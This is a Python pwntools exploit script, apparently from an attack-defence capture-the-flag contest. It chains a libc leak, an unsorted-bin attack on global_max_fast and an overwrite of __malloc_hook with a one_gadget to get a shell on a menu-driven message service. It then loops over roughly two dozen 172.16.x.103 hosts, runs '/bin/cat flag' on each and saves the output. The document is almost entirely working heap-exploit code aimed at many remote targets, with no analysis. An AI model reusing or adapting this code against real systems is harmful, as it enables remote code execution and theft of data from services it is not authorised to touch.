from pwn import *
#context.log_level = 'debug'
debug = 0


def leave(size,mes):
    p.recv()
    p.sendline('1')
    p.recv()
    p.sendline(str(size))
    p.recv()
    p.send(mes)

def delete(idx):
    p.recv()
    p.sendline(str('2'))
    p.recv()
    p.sendline(str(idx))

def show(idx):
    p.recv()
    p.sendline('3')
    p.recv()
    p.sendline(str(idx))

def getshell(n):
    p.recv()
    p.sendline('4')
    p.recv()
    p.sendline(str(n))
    

def expolit():
    leave(0x88,'a'*0x88)
    leave(0x210,'b'*0x1f0+p64(0x200)+p64(0x21)+'\n')
    leave(0x80,'c'*0x80)
    leave(0x80,'c'*0x80)
    delete(1)
    delete(0)
    leave(0x88,'e'*0x88)
    leave(0x100,'a'*0x100)
    leave(0x80,'a'*0x80)
    delete(1)
    delete(2)
    leave(0x100,'a'*0x100)
    show(4)
    p.recvuntil("Message: ")
    leak = u64(p.recv(6).ljust(8,'\x00'))
    print hex(leak)
    main_arena = leak - 88
    libc_base = main_arena - libc.symbols['__malloc_hook'] - 0x10
    print "main_arena-->[%s]"%hex(main_arena)
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    one_gadget = libc_base + 0xf02a4
    global_max_fast = libc_base + 0x3c67f8
    
    log.info("unsorted bin attack ")
    delete(1)
    leave(0x2a0,'a'*0x108+p64(0xc1)+'a'*0xb8+p64(0x91)+'a'*0x88+p64(0x51)+'\n')
    delete(1)
    leave(0x300,'a\n')
    delete(4)
    leave(0x2a0,'a'*0x108+p64(0xc0)+p64(global_max_fast-0x10)+p64(global_max_fast-0x10)+'a'*0xa0+p64(0xc0)+p64(0x91)+'\n')
    leave(0xb0,'a\n')
    delete(4)
    delete(2)
    log.info("unsorted bin attack done")


    leave(0x2a0,'a'*0x108+p64(0xc1)+p64(malloc_hook-0x10)+'\n')
    leave(0xb0,'a\n')
    delete(2)
    leave(0x2a0,'a'*0x108+p64(0xf1)+'a'*0xe8+p64(0x61)+'\n')

    delete(4)
    delete(2)
    leave(0x2a0,'a'*0x108+p64(0xf1)+p64(main_arena+0x58)+'a'*0xe0+p64(0x61)+'\n')#2
    leave(0xe0,'a\n')#4

    delete(2)
    leave(0x2a0,'a'*0x108+p64(0xe1)+p64(main_arena+0x58)+'a'*0xd0+p64(0x71)+'\n')#2

    leave(0xd0,'a\n')#5

    leave(0x80,p64(one_gadget)+'\n')

    delete(4)
    delete(5)
    p.sendline("/bin/cat flag")
    data=p.readline()
    data=p.readline()
    
    f.write(data)
    p.close()

def go():
    try :
	expolit()
    except Exception:
	return 

if __name__ == '__main__':
    f=open("flags","w")
    port = '20003'
    ban={17,19,20,21}
    for x in range(1,25):
	if x not in ban:
		host = '172.16.{}.103'.format(str(x))
		p  = remote(host,port)
	        libc = ELF('./libc-2.23.so')
	        go()
    f.close()
	
